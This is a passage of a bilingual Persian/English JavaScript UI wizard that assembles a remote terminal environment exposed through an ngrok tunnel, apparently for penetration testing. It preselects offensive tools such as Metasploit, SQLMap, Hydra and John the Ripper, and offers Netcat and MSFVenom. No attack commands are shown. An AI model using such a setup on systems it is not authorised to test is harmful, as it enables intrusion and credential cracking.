const L = {
  fa: {
    title: 'ویزارد محیط ترمینال',
    subtitle: 'ساخت محیط دسترسی از راه دور کامل',
    step1: 'شل',
    step2: 'ابزارها',
    step3: 'Ngrok',
    step4: 'احراز',
    step5: 'خلاصه',
    next: 'بعدی',
    back: 'قبلی',
    finish: 'تولید فرمان',
    shell_question: 'نوع شل را انتخاب کنید',
    shell_desc_cmd: 'خط فرمان ویندوز — محیط بومی ویندوز',
    shell_desc_powershell: 'شل پیشرفته ویندوز با قابلیت اسکریپت‌نویسی',
    shell_desc_bash: 'شل استاندارد لینوکس/مک — محبوب‌ترین شل',
    shell_desc_zsh: 'شل پیشرفته با autocomplete و تم‌های زیبا',
    shell_desc_sh: 'شل استاندارد POSIX — سبک و سریع',
    shell_desc_wsl: 'Windows Subsystem for Linux — اجرای لینوکس روی ویندوز',
    tools_title: 'ابزارهای مورد نیاز را انتخاب کنید',
    tools_subtitle: 'ابزارهای از پیش انتخاب شده‌اند',
    tab_scanning: 'اسکن',
    tab_exploitation: 'اکسپلویت',
    tab_web: 'وب',
    tab_password: 'رمز',
    tab_utility: 'کاربردی',
    select_all: 'انتخاب همه',
    deselect_all: 'لغو همه',
    selected_count: 'ابزار انتخاب شد',
    ngrok_title: 'تنظیمات Ngrok Tunnel',
    ngrok_token: 'Auth Token Ngrok',
    ngrok_token_placeholder: 'مثلاً 2h7QX...',
    ngrok_show: 'نمایش',
    ngrok_hide: 'مخفی',
    ngrok_test: 'تست توکن',
    ngrok_token_required: 'توکن الزامی است',
    ngrok_valid: 'توکن معتبر',
    ngrok_invalid: 'توکن نامعتبر',
    ngrok_tunnel_type: 'نوع تونل',
    ngrok_tunnel_tcp: 'TCP',
    ngrok_tunnel_http: 'HTTP',
    ngrok_tunnel_tls: 'TLS',
    ngrok_port: 'شماره پورت',
    ngrok_region: 'منطقه',
    ngrok_custom_domain: 'دامنه سفارشی (اختیاری)',
    ngrok_subdomain: 'زیردامنه (اختیاری)',
    auth_title: 'روش احراز هویت',
    auth_secret: 'توکن مخفی',
    auth_ssh: 'کلید SSH',
    auth_password: 'نام کاربری/رمز عبور',
    auth_api: 'کلید API',
    auth_generate: 'تولید',
    auth_copy: 'کپی',
    auth_copied: 'کپی شد',
    auth_custom: 'توکن دلخواه',
    auth_public_key: 'کلید عمومی SSH را وارد کنید',
    auth_generate_keypair: 'تولید کلید جدید',
    auth_generating: 'در حال تولید...',
    auth_instructions: 'دستورالعمل تولید کلید',
    auth_gen_ssh: 'برای تولید کلید SSH:',
    auth_gen_ssh_cmd: 'دستور بالا را اجرا کنید و کلید عمومی را بچسبانید',
    auth_username: 'نام کاربری',
    auth_password_label: 'رمز عبور',
    auth_strength_weak: 'ضعیف',
    auth_strength_medium: 'متوسط',
    auth_strength_strong: 'قوی',
    auth_require_all: 'الزام احراز برای همه اتصالات',
    auth_auto_ip: 'آی‌پی مجاز (اختیاری)',
    summary_title: 'خلاصه تنظیمات',
    summary_shell: 'شل',
    summary_tools: 'ابزارها',
    summary_tools_count: 'تعداد',
    summary_ngrok: 'Ngrok',
    summary_ngrok_token: 'توکن',
    summary_ngrok_tunnel: 'تونل',
    summary_ngrok_port: 'پورت',
    summary_ngrok_region: 'منطقه',
    summary_auth: 'احراز',
    summary_auth_method: 'روش',
    summary_auth_value: 'مقدار',
    summary_launch_command: 'فرمان راه‌اندازی',
    copy_command: 'کپی فرمان',
    copied: 'کپی شد!',
    download_config: 'دانلود کانفیگ',
    connect_web: 'اتصال از طریق وب',
    qr_hint: 'برای دیدن QR کد، ngrok را اجرا کنید',
    step_emoji1: '🖥️',
    step_emoji2: '🧰',
    step_emoji3: '🔗',
    step_emoji4: '🔑',
    step_emoji5: '✅',
    no_tools: 'هیچ ابزاری انتخاب نشده',
    port_placeholder: 'پورت',
    copy_title: 'کپی فرمان',
  },
  en: {
    title: 'Environment Wizard',
    subtitle: 'Build a complete remote terminal environment',
    step1: 'Shell',
    step2: 'Tools',
    step3: 'Ngrok',
    step4: 'Auth',
    step5: 'Summary',
    next: 'Next',
    back: 'Back',
    finish: 'Generate Command',
    shell_question: 'Select your shell type',
    shell_desc_cmd: 'Windows Command Prompt — native Windows shell',
    shell_desc_powershell: 'Advanced Windows shell with scripting capabilities',
    shell_desc_bash: 'Standard Linux/Mac shell — most popular',
    shell_desc_zsh: 'Advanced shell with autocomplete and themes',
    shell_desc_sh: 'Standard POSIX shell — lightweight and fast',
    shell_desc_wsl: 'Windows Subsystem for Linux — run Linux on Windows',
    tools_title: 'Select tools to include',
    tools_subtitle: 'Popular tools are pre-selected',
    tab_scanning: 'Scanning',
    tab_exploitation: 'Exploitation',
    tab_web: 'Web',
    tab_password: 'Password',
    tab_utility: 'Utility',
    select_all: 'Select All',
    deselect_all: 'Deselect All',
    selected_count: 'tools selected',
    ngrok_title: 'Ngrok Tunnel Configuration',
    ngrok_token: 'Ngrok Auth Token',
    ngrok_token_placeholder: 'e.g. 2h7QX...',
    ngrok_show: 'Show',
    ngrok_hide: 'Hide',
    ngrok_test: 'Test Token',
    ngrok_token_required: 'Token Required',
    ngrok_valid: 'Valid Token',
    ngrok_invalid: 'Invalid Token',
    ngrok_tunnel_type: 'Tunnel Type',
    ngrok_tunnel_tcp: 'TCP',
    ngrok_tunnel_http: 'HTTP',
    ngrok_tunnel_tls: 'TLS',
    ngrok_port: 'Port Number',
    ngrok_region: 'Region',
    ngrok_custom_domain: 'Custom Domain (optional)',
    ngrok_subdomain: 'Subdomain (optional)',
    auth_title: 'Authorization Method',
    auth_secret: 'Secret Token',
    auth_ssh: 'SSH Key',
    auth_password: 'Username/Password',
    auth_api: 'API Key',
    auth_generate: 'Generate',
    auth_copy: 'Copy',
    auth_copied: 'Copied',
    auth_custom: 'Custom Token',
    auth_public_key: 'Enter SSH public key',
    auth_generate_keypair: 'Generate New Keypair',
    auth_generating: 'Generating...',
    auth_instructions: 'Key generation instructions',
    auth_gen_ssh: 'To generate an SSH keypair:',
    auth_gen_ssh_cmd: 'Run the above command and paste your public key',
    auth_username: 'Username',
    auth_password_label: 'Password',
    auth_strength_weak: 'Weak',
    auth_strength_medium: 'Medium',
    auth_strength_strong: 'Strong',
    auth_require_all: 'Require auth for all connections',
    auth_auto_ip: 'Auto-authorize IP (optional)',
    summary_title: 'Configuration Summary',
    summary_shell: 'Shell',
    summary_tools: 'Tools',
    summary_tools_count: 'Count',
    summary_ngrok: 'Ngrok',
    summary_ngrok_token: 'Token',
    summary_ngrok_tunnel: 'Tunnel',
    summary_ngrok_port: 'Port',
    summary_ngrok_region: 'Region',
    summary_auth: 'Auth',
    summary_auth_method: 'Method',
    summary_auth_value: 'Value',
    summary_launch_command: 'Launch Command',
    copy_command: 'Copy Command',
    copied: 'Copied!',
    download_config: 'Download Config',
    connect_web: 'Connect via Web',
    qr_hint: 'Run ngrok to see the QR code URL',
    step_emoji1: '🖥️',
    step_emoji2: '🧰',
    step_emoji3: '🔗',
    step_emoji4: '🔑',
    step_emoji5: '✅',
    no_tools: 'No tools selected',
    port_placeholder: 'Port',
    copy_title: 'Copy Command',
  }
};

const TOOLS_DATA = [
  { id: 'nmap', name: 'Nmap', cat: 'scanning', desc_fa: 'اسکنر پیشرفته پورت و شبکه', desc_en: 'Advanced port and network scanner', default: true },
  { id: 'masscan', name: 'Masscan', cat: 'scanning', desc_fa: 'اسکنر سریع شبکه (میلیون‌ها پورت)', desc_en: 'Fast network scanner (millions of ports)', default: false },
  { id: 'rustscan', name: 'RustScan', cat: 'scanning', desc_fa: 'اسکنر فوق سریع با Nmap', desc_en: 'Ultra-fast scanner with Nmap integration', default: false },
  { id: 'zenmap', name: 'Zenmap', cat: 'scanning', desc_fa: 'رابط گرافیکی Nmap', desc_en: 'GUI for Nmap', default: false },
  { id: 'sqlmap', name: 'SQLMap', cat: 'exploitation', desc_fa: 'تزریق خودکار SQL', desc_en: 'Automated SQL injection tool', default: true },
  { id: 'metasploit', name: 'Metasploit', cat: 'exploitation', desc_fa: 'فریمورک اکسپلویت', desc_en: 'Exploitation framework', default: true },
  { id: 'searchsploit', name: 'Searchsploit', cat: 'exploitation', desc_fa: 'جستجوی اکسپلویت در ExploitDB', desc_en: 'ExploitDB search tool', default: false },
  { id: 'msfvenom', name: 'MSFVenom', cat: 'exploitation', desc_fa: 'تولید پیلود برای Metasploit', desc_en: 'Payload generator for Metasploit', default: false },
  { id: 'gobuster', name: 'Gobuster', cat: 'web', desc_fa: 'بروت فورس مسیرها و زیردامنه‌ها', desc_en: 'Directory and subdomain brute-forcer', default: true },
  { id: 'dirb', name: 'Dirb', cat: 'web', desc_fa: 'اسکنر دایرکتوری وب', desc_en: 'Web directory scanner', default: true },
  { id: 'nikto', name: 'Nikto', cat: 'web', desc_fa: 'اسکنر آسیب‌پذیری وب سرور', desc_en: 'Web server vulnerability scanner', default: true },
  { id: 'wpscan', name: 'WPScan', cat: 'web', desc_fa: 'اسکنر امنیتی وردپرس', desc_en: 'WordPress security scanner', default: false },
  { id: 'hydra', name: 'Hydra', cat: 'password', desc_fa: 'بروت فورس لاگین شبكه', desc_en: 'Network login brute-forcer', default: true },
  { id: 'john', name: 'John the Ripper', cat: 'password', desc_fa: 'شکننده رمز عبور آفلاین', desc_en: 'Offline password cracker', default: true },
  { id: 'hashcat', name: 'Hashcat', cat: 'password', desc_fa: 'شکننده رمز مبتنی بر GPU', desc_en: 'GPU-based password recovery', default: false },
  { id: 'python3', name: 'Python 3', cat: 'utility', desc_fa: 'زبان برنامه‌نویسی همه‌منظوره', desc_en: 'General-purpose programming language', default: true },
  { id: 'node', name: 'Node.js', cat: 'utility', desc_fa: 'اجرای جاوااسکریپت سمت سرور', desc_en: 'Server-side JavaScript runtime', default: true },
  { id: 'curl', name: 'cURL', cat: 'utility', desc_fa: 'انتقال داده با URL', desc_en: 'Data transfer with URLs', default: true },
  { id: 'wget', name: 'Wget', cat: 'utility', desc_fa: 'دانلود غیرفعال فایل', desc_en: 'Non-interactive file downloader', default: true },
  { id: 'git', name: 'Git', cat: 'utility', desc_fa: 'سیستم کنترل نسخه', desc_en: 'Version control system', default: true },
  { id: 'docker', name: 'Docker', cat: 'utility', desc_fa: 'مدیریت کانتینرها', desc_en: 'Container management platform', default: true },
  { id: 'kubectl', name: 'Kubectl', cat: 'utility', desc_fa: 'مدیریت کلاستر Kubernetes', desc_en: 'Kubernetes cluster manager', default: false },
  { id: 'socat', name: 'Socat', cat: 'utility', desc_fa: 'ارسال دوطرفه داده', desc_en: 'Bidirectional data relay', default: false },
  { id: 'netcat', name: 'Netcat', cat: 'utility', desc_fa: 'ابزار شبکه همه‌منظوره', desc_en: 'Swiss-army knife networking tool', default: false },
  { id: 'tmux', name: 'Tmux', cat: 'utility', desc_fa: 'مدیریت چندین ترمینال', desc_en: 'Terminal multiplexer', default: false },
  { id: 'screen', name: 'Screen', cat: 'utility', desc_fa: 'مدیریت جلسات ترمینال', desc_en: 'Terminal session manager', default: false },
];

const CATEGORIES = ['scanning', 'exploitation', 'web', 'password', 'utility'];
const CATEGORY_EMOJI = { scanning: '🔍', exploitation: '💥', web: '🌐', password: '🔑', utility: '🧰' };
const SHELLS = [
  { id: 'cmd', icon: '▶️', name_fa: 'CMD', name_en: 'CMD', desc_key: 'shell_desc_cmd' },
  { id: 'powershell', icon: '🪟', name_fa: 'PowerShell', name_en: 'PowerShell', desc_key: 'shell_desc_powershell' },
  { id: 'bash', icon: '🐧', name_fa: 'Bash', name_en: 'Bash', desc_key: 'shell_desc_bash' },
  { id: 'zsh', icon: '💻', name_fa: 'Zsh', name_en: 'Zsh', desc_key: 'shell_desc_zsh' },
  { id: 'sh', icon: '⚡', name_fa: 'SH', name_en: 'SH', desc_key: 'shell_desc_sh' },
  { id: 'wsl', icon: '🐚', name_fa: 'WSL', name_en: 'WSL', desc_key: 'shell_desc_wsl' },
];

function getInitialState() {
  const saved = localStorage.getItem('ew-state');
  if (saved) {
    try { return JSON.parse(saved); } catch(e) {}
  }
  return {
    step: 1,
    shell: 'bash',
    tools: TOOLS_DATA.filter(t => t.default).map(t => t.id),
    ngrokToken: '',
    ngrokTokenStatus: 'required',
    ngrokTunnelType: 'tcp',
    ngrokPort: '22',
    ngrokRegion: 'us',
    ngrokDomain: '',
    ngrokSubdomain: '',
    authMethod: 'secret',
    authSecretToken: generateToken(32),
    authCustomToken: '',
    authSSHKey: '',
    authUsername: '',
    authPassword: '',
    authAPIKey: generateToken(48),
    authRequireAll: true,
    authAutoIP: '',
  };
}

function generateToken(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  const array = new Uint8Array(length);
  crypto.getRandomValues(array);
  for (let i = 0; i < length; i++) {
    result += chars[array[i] % chars.length];
  }
  return result;
}

function getPasswordStrength(pass) {
  let score = 0;
  if (pass.length >= 8) score++;
  if (pass.length >= 12) score++;
  if (/[a-z]/.test(pass) && /[A-Z]/.test(pass)) score++;
  if (/\d/.test(pass)) score++;
  if (/[^a-zA-Z0-9]/.test(pass)) score++;
  return score;
}

function esc(str) {
  return str.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

export default function render(lang) {
  const t = L[lang] || L.en;
  const isRtl = lang === 'fa';
  const dir = isRtl ? 'rtl' : 'ltr';
  const state = getInitialState();

  function txt(key) { return t[key] || key; }

  function renderStepIndicator(currentStep) {
    const steps = [1, 2, 3, 4, 5];
    const labels = [txt('step1'), txt('step2'), txt('step3'), txt('step4'), txt('step5')];
    const emojis = [txt('step_emoji1'), txt('step_emoji2'), txt('step_emoji3'), txt('step_emoji4'), txt('step_emoji5')];
    return `<div style="display:flex;align-items:center;justify-content:center;gap:0;margin-bottom:24px;padding:0 8px;flex-wrap:nowrap;overflow-x:auto">
      ${steps.map((s, i) => {
        const active = s === currentStep;
        const done = s < currentStep;
        const circleSize = isRtl ? '42px' : '36px';
        return `<div style="display:flex;align-items:center;gap:0;flex-shrink:0">
          <div style="display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer" data-ew-goto="${s}" data-ew-step-circle>
            <div style="width:${circleSize};height:${circleSize};border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:${active?'18px':'16px'};font-weight:700;transition:all .3s ease;background:${active?'var(--accent,#6366f1)':done?'#22c55e':'var(--card,#1e1e2e)'};color:${active||done?'#fff':'var(--muted-foreground,#64748b)'};border:2px solid ${active?'var(--accent,#6366f1)':done?'#22c55e':'var(--border,#334155)'};box-shadow:${active?'0 0 12px rgba(99,102,241,.4)':'none'}">
              ${done ? '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>' : emojis[i]}
            </div>
            <span style="font-size:11px;font-weight:${active?'700':'500'};color:${active?'var(--foreground,#fff)':'var(--muted-foreground,#64748b)'};white-space:nowrap;transition:color .3s;display:${isRtl?'none':'block'}">${labels[i]}</span>
          </div>
          ${i < steps.length - 1 ? `<div style="width:${isRtl?'28px':'40px'};height:3px;border-radius:2px;margin:0 4px;margin-bottom:20px;background:${done||active?'var(--accent,#6366f1)':'var(--border,#334155)'};transition:background .3s"></div>` : ''}
        </div>`;
      }).join('')}
    </div>`;
  }

  function renderStep1() {
    return `<div class="ew-step" data-ew-step="1">
      <div style="text-align:center;margin-bottom:20px">
        <div style="font-size:2rem;margin-bottom:8px">${txt('step_emoji1')}</div>
        <h3 style="margin:0 0 4px;font-size:1.2rem;font-weight:700">${txt('shell_question')}</h3>
      </div>
      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;max-width:700px;margin:0 auto">
        ${SHELLS.map(sh => {
          const sel = state.shell === sh.id;
          return `<div data-ew-shell="${sh.id}" style="cursor:pointer;border:2px solid ${sel?'var(--accent,#6366f1)':'var(--border,#334155)'};border-radius:12px;padding:16px;background:${sel?'rgba(99,102,241,.1)':'var(--card,#1e1e2e)'};transition:all .2s;text-align:center;user-select:none" onmouseover="this.style.borderColor='${sel?'var(--accent,#6366f1)':'var(--accent-hover,#818cf8)'}'" onmouseout="this.style.borderColor='${sel?'var(--accent,#6366f1)':'var(--border,#334155)'}'">
            <div style="font-size:2rem;margin-bottom:6px">${sh.icon}</div>
            <div style="font-weight:700;font-size:.9rem;margin-bottom:4px">${lang === 'fa' ? sh.name_fa : sh.name_en}</div>
            <div style="font-size:.75rem;color:var(--muted-foreground,#64748b);line-height:1.3">${txt(sh.desc_key)}</div>
          </div>`;
        }).join('')}
      </div>
    </div>`;
  }

  function renderStep2() {
    const selected = state.tools || [];
    const cats = CATEGORIES;
    return `<div class="ew-step" data-ew-step="2">
      <div style="text-align:center;margin-bottom:12px">
        <div style="font-size:2rem;margin-bottom:8px">${txt('step_emoji2')}</div>
        <h3 style="margin:0 0 4px;font-size:1.2rem;font-weight:700">${txt('tools_title')}</h3>
        <p style="margin:0;font-size:.85rem;color:var(--muted-foreground,#64748b)">${txt('tools_subtitle')}</p>
      </div>
      <div style="text-align:center;margin-bottom:16px">
        <span id="ew-tool-count" style="font-size:.85rem;color:var(--muted-foreground,#64748b);background:var(--card,#1e1e2e);padding:4px 12px;border-radius:999px;border:1px solid var(--border,#334155)">${selected.length} ${txt('selected_count')}</span>
      </div>
      <div style="display:flex;flex-wrap:wrap;gap:6px;justify-content:center;margin-bottom:16px" id="ew-cat-tabs">
        ${cats.map((cat, idx) =>
          `<button class="ew-cat-tab ${idx===0?'active':''}" data-ew-cat="${cat}" style="padding:6px 14px;border-radius:6px;border:1px solid var(--border,#334155);background:${idx===0?'var(--accent,#6366f1)':'var(--card,#1e1e2e)'};color:${idx===0?'#fff':'var(--foreground,#c0caf5)'};cursor:pointer;font-size:.8rem;transition:all .15s;display:inline-flex;align-items:center;gap:4px">${CATEGORY_EMOJI[cat]} ${txt('tab_'+cat)}</button>`
        ).join('')}
      </div>
      ${cats.map(cat => {
        const catTools = TOOLS_DATA.filter(t => t.cat === cat);
        const catSelected = catTools.filter(t => selected.includes(t.id));
        return `<div class="ew-tools-cat" data-ew-cat-panel="${cat}" style="display:${cats.indexOf(cat)===0?'block':'none'};margin-bottom:16px">
          <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap">
            <button class="ew-sel-all" data-ew-cat="${cat}" style="padding:4px 12px;border-radius:6px;border:1px solid var(--accent,#6366f1);background:transparent;color:var(--accent,#6366f1);cursor:pointer;font-size:.78rem">${txt('select_all')}</button>
            <button class="ew-sel-none" data-ew-cat="${cat}" style="padding:4px 12px;border-radius:6px;border:1px solid var(--border,#334155);background:transparent;color:var(--muted-foreground,#64748b);cursor:pointer;font-size:.78rem">${txt('deselect_all')}</button>
            <span style="font-size:.78rem;color:var(--muted-foreground,#64748b);line-height:30px">${catSelected.length}/${catTools.length}</span>
          </div>
          <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px">
            ${catTools.map(tool => {
              const isSel = selected.includes(tool.id);
              return `<label data-ew-tool-label="${tool.id}" style="display:flex;align-items:center;gap:8px;padding:8px 10px;border-radius:8px;border:1px solid ${isSel?'var(--accent,#6366f1)':'var(--border,#334155)'};background:${isSel?'rgba(99,102,241,.08)':'var(--card,#1e1e2e)'};cursor:pointer;transition:all .15s;user-select:none">
                <input type="checkbox" data-ew-tool="${tool.id}" ${isSel?'checked':''} style="accent-color:var(--accent,#6366f1);width:16px;height:16px;cursor:pointer;flex-shrink:0">
                <div style="flex:1;min-width:0">
                  <div style="font-weight:600;font-size:.82rem">${tool.name}</div>
                  <div style="font-size:.7rem;color:var(--muted-foreground,#64748b);line-height:1.2">${lang === 'fa' ? tool.desc_fa : tool.desc_en}</div>
                </div>
              </label>`;
            }).join('')}
          </div>
        </div>`;
      }).join('')}
    </div>`;
  }

  function renderStep3() {
    const ngrokTokenMasked = state.ngrokToken ? '••••••••' + state.ngrokToken.slice(-4) : '';
    const statusColors = { required: 'var(--muted-foreground,#64748b)', valid: '#22c55e', invalid: '#ef4444' };
    const statusIcons = { required: '⚪', valid: '🟢', invalid: '🔴' };
    return `<div class="ew-step" data-ew-step="3">
      <div style="text-align:center;margin-bottom:20px">
        <div style="font-size:2rem;margin-bottom:8px">${txt('step_emoji3')}</div>
        <h3 style="margin:0;font-size:1.2rem;font-weight:700">${txt('ngrok_title')}</h3>
      </div>
      <div style="max-width:550px;margin:0 auto;display:flex;flex-direction:column;gap:14px">
        <div>
          <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('ngrok_token')}</label>
          <div style="display:flex;gap:8px;align-items:center">
            <div style="flex:1;position:relative">
              <input id="ew-ngrok-token-input" type="password" value="${esc(state.ngrokToken)}" placeholder="${txt('ngrok_token_placeholder')}" style="width:100%;padding:10px 12px;padding-right:${isRtl?'50px':'auto'};padding-left:${isRtl?'auto':'50px'};border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;box-sizing:border-box;font-family:monospace" dir="ltr">
            </div>
            <button id="ew-ngrok-toggle" style="padding:8px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);cursor:pointer;font-size:.8rem;white-space:nowrap">${txt('ngrok_show')}</button>
            <button id="ew-ngrok-test" style="padding:8px 12px;border-radius:8px;border:1px solid var(--accent,#6366f1);background:var(--accent,#6366f1);color:#fff;cursor:pointer;font-size:.8rem;white-space:nowrap">${txt('ngrok_test')}</button>
          </div>
          <div id="ew-ngrok-status" style="display:flex;align-items:center;gap:6px;margin-top:6px;font-size:.8rem;color:${statusColors[state.ngrokTokenStatus] || statusColors.required}">
            <span>${statusIcons[state.ngrokTokenStatus] || statusIcons.required}</span>
            <span>${txt('ngrok_token_'+state.ngrokTokenStatus)}</span>
          </div>
        </div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
          <div>
            <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('ngrok_tunnel_type')}</label>
            <select id="ew-ngrok-type" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;cursor:pointer">
              <option value="tcp" ${state.ngrokTunnelType==='tcp'?'selected':''}>${txt('ngrok_tunnel_tcp')}</option>
              <option value="http" ${state.ngrokTunnelType==='http'?'selected':''}>${txt('ngrok_tunnel_http')}</option>
              <option value="tls" ${state.ngrokTunnelType==='tls'?'selected':''}>${txt('ngrok_tunnel_tls')}</option>
            </select>
          </div>
          <div>
            <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('ngrok_port')}</label>
            <input id="ew-ngrok-port" type="number" value="${state.ngrokPort}" placeholder="${txt('port_placeholder')}" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;box-sizing:border-box;font-family:monospace" dir="ltr">
          </div>
        </div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
          <div>
            <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('ngrok_region')}</label>
            <select id="ew-ngrok-region" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;cursor:pointer">
              <option value="us" ${state.ngrokRegion==='us'?'selected':''}>United States (us)</option>
              <option value="eu" ${state.ngrokRegion==='eu'?'selected':''}>Europe (eu)</option>
              <option value="ap" ${state.ngrokRegion==='ap'?'selected':''}>Asia/Pacific (ap)</option>
              <option value="au" ${state.ngrokRegion==='au'?'selected':''}>Australia (au)</option>
              <option value="sa" ${state.ngrokRegion==='sa'?'selected':''}>South America (sa)</option>
              <option value="jp" ${state.ngrokRegion==='jp'?'selected':''}>Japan (jp)</option>
              <option value="in" ${state.ngrokRegion==='in'?'selected':''}>India (in)</option>
            </select>
          </div>
          <div>
            <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('ngrok_subdomain')}</label>
            <input id="ew-ngrok-subdomain" type="text" value="${esc(state.ngrokSubdomain)}" placeholder="myapp" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;box-sizing:border-box" dir="ltr">
          </div>
        </div>
        <div>
          <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('ngrok_custom_domain')}</label>
          <input id="ew-ngrok-domain" type="text" value="${esc(state.ngrokDomain)}" placeholder="tunnel.example.com" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;box-sizing:border-box" dir="ltr">
        </div>
      </div>
    </div>`;
  }

  function renderStep4() {
    const strength = getPasswordStrength(state.authPassword);
    const strengthLabels = [txt('auth_strength_weak'), txt('auth_strength_medium'), txt('auth_strength_strong')];
    const strengthColors = ['#ef4444', '#eab308', '#22c55e'];
    const strengthPct = ['33%', '66%', '100%'];
    return `<div class="ew-step" data-ew-step="4">
      <div style="text-align:center;margin-bottom:20px">
        <div style="font-size:2rem;margin-bottom:8px">${txt('step_emoji4')}</div>
        <h3 style="margin:0;font-size:1.2rem;font-weight:700">${txt('auth_title')}</h3>
      </div>
      <div style="max-width:550px;margin:0 auto">
        <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:16px;justify-content:center">
          ${['secret','ssh','password','api'].map(m => {
            const icons = { secret: '🔑', ssh: '🔐', password: '👤', api: '🔌' };
            const labels = { secret: txt('auth_secret'), ssh: txt('auth_ssh'), password: txt('auth_password'), api: txt('auth_api') };
            const active = state.authMethod === m;
            return `<button data-ew-auth-method="${m}" style="padding:8px 16px;border-radius:8px;border:2px solid ${active?'var(--accent,#6366f1)':'var(--border,#334155)'};background:${active?'rgba(99,102,241,.1)':'var(--card,#1e1e2e)'};color:var(--foreground,#c0caf5);cursor:pointer;font-size:.85rem;display:flex;align-items:center;gap:6px;transition:all .15s">
              <span>${icons[m]}</span> ${labels[m]}
            </button>`;
          }).join('')}
        </div>
        <div id="ew-auth-secret" style="display:${state.authMethod==='secret'?'block':'none'}">
          <div style="margin-bottom:12px">
            <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('auth_secret')}</label>
            <div style="display:flex;gap:8px">
              <input id="ew-auth-secret-input" type="text" value="${esc(state.authSecretToken)}" readonly style="flex:1;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;font-family:monospace;cursor:default" dir="ltr">
              <button id="ew-auth-secret-copy" style="padding:8px 14px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);cursor:pointer;font-size:.8rem">${txt('auth_copy')}</button>
              <button id="ew-auth-secret-gen" style="padding:8px 14px;border-radius:8px;border:1px solid var(--accent,#6366f1);background:var(--accent,#6366f1);color:#fff;cursor:pointer;font-size:.8rem">${txt('auth_generate')}</button>
            </div>
          </div>
          <div>
            <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('auth_custom')}</label>
            <input id="ew-auth-secret-custom" type="text" value="${esc(state.authCustomToken)}" placeholder="${txt('auth_secret')}" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;box-sizing:border-box" dir="ltr">
          </div>
        </div>
        <div id="ew-auth-ssh" style="display:${state.authMethod==='ssh'?'block':'none'}">
          <div style="margin-bottom:12px">
            <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('auth_public_key')}</label>
            <textarea id="ew-auth-ssh-input" rows="4" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.82rem;outline:none;resize:vertical;font-family:monospace;box-sizing:border-box" dir="ltr" placeholder="ssh-rsa AAAA...">${esc(state.authSSHKey)}</textarea>
          </div>
          <div style="margin-bottom:12px">
            <button id="ew-auth-ssh-gen" style="padding:8px 14px;border-radius:8px;border:1px solid var(--accent,#6366f1);background:var(--accent,#6366f1);color:#fff;cursor:pointer;font-size:.8rem">${txt('auth_generate_keypair')}</button>
          </div>
          <div id="ew-auth-ssh-instructions" style="display:none;padding:12px;border-radius:8px;background:var(--card,#1e1e2e);border:1px solid var(--border,#334155);font-size:.82rem;font-family:monospace;line-height:1.6" dir="ltr">
            <div style="font-weight:600;margin-bottom:8px">${txt('auth_instructions')}</div>
            <div>${txt('auth_gen_ssh')}</div>
            <code style="display:block;padding:8px;background:#0a0a0f;border-radius:4px;margin:6px 0;color:#22c55e">ssh-keygen -t rsa -b 4096 -C "maddix@env"</code>
            <div style="color:var(--muted-foreground,#64748b)">${txt('auth_gen_ssh_cmd')}</div>
          </div>
        </div>
        <div id="ew-auth-password" style="display:${state.authMethod==='password'?'block':'none'}">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px">
            <div>
              <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('auth_username')}</label>
